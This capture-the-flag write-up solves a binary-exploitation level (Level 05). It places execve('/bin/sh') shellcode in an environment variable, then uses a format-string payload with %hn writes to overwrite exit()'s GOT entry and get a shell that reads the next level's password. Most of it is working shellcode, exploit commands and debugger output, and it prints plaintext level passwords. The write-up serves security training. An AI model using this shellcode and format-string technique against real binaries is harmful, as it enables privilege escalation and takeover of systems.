# Level 05
*password : 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN*

## Analyze

```
scp -P 4242 level05@192.168.56.109:level05 binary/
```

```
(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

return exit() : 0x080497e0

shellcode : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80`
```
$ export SHELLCODE=$(python -c 'print "\x90" * 200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"')
```

```
(gdb) x/200x environ
...
0xffffd80c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd81c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd82c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd83c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd84c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd85c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd86c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd87c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd88c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd89c:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8ac:     0x90909090      0x90909090      0x90909090      0x90909090
0xffffd8bc:     0x90909090      0x90909090      0x90909090      0x90909090
...
---Type <return> to continue, or q <return> to quit---
```

env SHELLCODE address : 0xffffd8ac

- ffff = 65535
- d8ac = 55468
55468 - 8 = 55460\
65535 - 55468 = 10067

return exit() + 2 : 0x080497e2

```
$ python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55460u" + "%10$hn" + "%10067u" + "%11$hn %10$p"' > /tmp/level05
$ cat /tmp/level05 - | ./level05
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
